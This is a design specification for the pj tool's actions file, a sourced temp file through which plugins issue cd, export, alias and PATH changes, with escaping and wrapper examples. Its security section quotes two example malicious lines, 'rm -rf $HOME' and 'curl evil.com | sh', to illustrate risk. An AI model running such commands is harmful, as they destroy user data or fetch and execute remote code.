# Actions Specification `pj`

## 1. Summary

The actions file is a **dedicated separate channel** for shell actions. Hybrid plugins write shell code to this file, and the shell wrapper sources it within the parent shell context.

Why a file instead of stdout:

* stdout is reserved for human-readable output.
* The actions file is reserved for shell actions.
* Outputs are never mixed.
* Human output streaming continues uninterrupted.

## 2. File Location

The wrapper determines the file path via `PJ_ACTIONS_FILE`:

* Default: `mktemp -t pj-actions.XXXXXX` → `/tmp/pj-actions-xxxxx`
* Preferred: `$XDG_RUNTIME_DIR/pj-actions.XXXXXX`
* Permissions: `0600`

Plugins **must not** create the file themselves. The wrapper is responsible for creation.

## 3. Format

The file contains **shell code** that is valid for the specified `PJ_SHELL`.

Example for bash/zsh:

```sh
cd '/home/user/projects/foo'
export FOO='bar'
unset BAZ
alias gs='git status'

```

Example for fish:

```fish
cd '/home/user/projects/foo'
set -gx FOO 'bar'
set -e BAZ
alias gs='git status'

```

Example for nushell:

```nu
cd '/home/user/projects/foo'
$env.FOO = 'bar'
hide BAZ

```

## 4. Shell Detection

The wrapper sets `PJ_SHELL` before executing the plugin. Valid values:

| Value | Shell |
| --- | --- |
| `bash` | GNU Bash |
| `zsh` | Zsh |
| `fish` | Fish |
| `nu` | Nushell |
| `sh` | POSIX sh |
| `pwsh` | PowerShell |
| `elvish` | Elvish |

Plugins read `PJ_SHELL` and generate the appropriate syntax.

If `PJ_SHELL` is empty or unset, default to `sh` (POSIX).

## 5. Action Types

### 5.1 Change Directory

```sh
cd '/path/to/dir'

```

* Path must be absolute.
* Path must be properly escaped.
* Plugins **must** validate the path before writing.

### 5.2 Set Environment Variable

```sh
export KEY='value'

```

* Value must be escaped.
* Multiple statements permitted.

### 5.3 Unset Environment Variable

```sh
unset KEY

```

* Multiple statements permitted.

### 5.4 Alias

```sh
alias name='command'

```

* Name: `[a-zA-Z_][a-zA-Z0-9_]*`.
* Command: an escaped string.

### 5.5 Unalias

```sh
unalias name

```

### 5.6 Prepend PATH

```sh
export PATH='/new/path':"$PATH"

```

* Used for version managers (e.g., pyenv, nvm, mise).
* Use proper syntax for the respective shell.

### 5.7 Source File

```sh
source '/path/to/file'

```

* Used for project-specific initializations (e.g., venv, nix-shell).
* Plugins **must** validate the path beforehand.

### 5.8 Prompt Modification

```sh
PS1='...'

```

* Used for prompt integrations.
* Shell-specific implementation.

## 6. Escaping

Escaping is the **sole responsibility of the plugin**. Improper escaping leads to shell injection risks.

### 6.1 POSIX (bash, zsh, sh)

```go
func posixEscape(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

```

Examples:

* `foo` → `'foo'`
* `my project` → `'my project'`
* `it's` → `'it'\''s'`

### 6.2 Fish

```go
func fishEscape(s string) string {
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, "'", "\\'")
    return "'" + s + "'"
}

```

### 6.3 Nushell

```go
func nuEscape(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

```

### 6.4 PowerShell

```go
func pwshEscape(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

```

## 7. Validation

Plugins **must** validate state before writing shell actions:

### 7.1 Path Validation

```go
info, err := os.Stat(path)
if err != nil {
    // do not write cd action
    return err
}
if !info.IsDir() {
    return fmt.Errorf("not a directory: %s", path)
}

```

### 7.2 Environment Variable Validation

* Key: `[A-Za-z_][A-Za-z0-9_]*`.
* Value: arbitrary string, but must be properly escaped.

### 7.3 Alias Validation

* Name: `[a-zA-Z_][a-zA-Z0-9_]*`.
* Avoid overwriting critical built-in aliases (optional).

## 8. Wrapper Contract

The wrapper **must**:

1. Create a tmpfile using `mktemp`.
2. Set `PJ_ACTIONS_FILE` to the tmpfile path.
3. Set `PJ_SHELL` according to the current shell.
4. Call `pj` passing the user arguments.
5. Check if the tmpfile is non-empty.
6. If non-empty, `source` the file within the parent shell context.
7. Delete the tmpfile.
8. Return the plugin's exit code.

The wrapper **must not**:

1. Parse the contents of the actions file.
2. Modify the contents of the actions file.
3. Retain the actions file after execution completes.
4. Ignore the plugin's exit code.

## 9. Wrapper Example: Bash

```bash
pj() {
    local actions rc
    actions=$(mktemp -t pj-actions.XXXXXX) || return 1
    trap "rm -f '$actions'" RETURN

    PJ_SHELL=bash \
    PJ_ACTIONS_FILE="$actions" \
    command pj "$@"
    rc=$?

    if [[ -s "$actions" ]]; then
        source "$actions"
    fi

    return $rc
}

```

## 10. Wrapper Example: Zsh

```zsh
pj() {
    local actions rc
    actions=$(mktemp -t pj-actions.XXXXXX) || return 1
    trap "rm -f '$actions'" EXIT

    PJ_SHELL=zsh \
    PJ_ACTIONS_FILE="$actions" \
    command pj "$@"
    rc=$?

    if [[ -s "$actions" ]]; then
        source "$actions"
    fi

    return $rc
}

```

## 11. Wrapper Example: Fish

```fish
function pj
    set -l actions (mktemp -t pj-actions.XXXXXX)
    set -l rc 0

    PJ_SHELL=fish PJ_ACTIONS_FILE=$actions command pj $argv
    set rc $status

    if test -s $actions
        source $actions
    end

    rm -f $actions
    return $rc
end

```

## 12. Security

### 12.1 Risks

The actions file is directly sourced by the active shell session. A malicious plugin could write commands such as:

```sh
rm -rf $HOME
curl evil.com | sh

```

### 12.2 Mitigations

* Plugins are user-installed binaries; execution implies explicit trust.
* Tmpfiles reside in `$XDG_RUNTIME_DIR` or `/tmp` with strict `0600` permissions.
* File ownership must belong to the active user.
* Wrappers must never `source` files from untrusted paths.
* Path verification: restrict sourcing to `$XDG_RUNTIME_DIR` or `/tmp`.

### 12.3 Validation in Wrapper

```bash
case "$actions" in
    "$XDG_RUNTIME_DIR"/*|/tmp/*) ;;
    *) echo "pj: invalid actions file location" >&2; return 1 ;;
esac

```

## 13. Debugging

To inspect generated actions without sourcing:

```text
$ PJ_ACTIONS_FILE=/tmp/actions pj jump foo
$ cat /tmp/actions

```

To test wrapper sourcing logic without running a plugin:

```text
$ echo "cd /tmp" > /tmp/actions
$ source /tmp/actions

```

## 14. Alternative Formats (Not Recommended)

### 14.1 JSON + Helper

Plugin outputs:

```json
{"cd": "/path", "env": {"FOO": "bar"}}

```

Wrapper executes helper:

```sh
eval "$(pj-apply-actions < $actions)"

```

**Pros:** Plugins do not need shell syntax awareness.

**Cons:** Requires a helper binary, uses `eval`, fragile execution.

### 14.2 File Descriptor 3

Plugin writes actions directly to file descriptor 3.

**Pros:** Does not require temporary files.

**Cons:** Non-portable across environments, difficult to debug.

### 14.3 Stdout Marker

Plugin outputs:

```text
Jumping to foo...
__PJ_ACTIONS__
cd /path

```

Wrapper scans for the marker delimiter.

**Pros:** Single stream/channel.

**Cons:** Breaks stdout streaming, fragile parsing logic.

**Recommendation:** Stick to the actions file model with direct shell code formatting.

## 15. Checklist for Hybrid Plugins

* [ ] Check `PJ_ACTIONS_FILE`; skip action generation if empty or unset.
* [ ] Check `PJ_SHELL`; default to `sh`.
* [ ] Validate target paths before issuing `cd`.
* [ ] Properly escape paths based on the active shell syntax.
* [ ] Properly escape environment values.
* [ ] Output only necessary action statements.
* [ ] Do not output human-readable text into the actions file.
* [ ] Verify test functionality in bash, zsh, and fish environments.
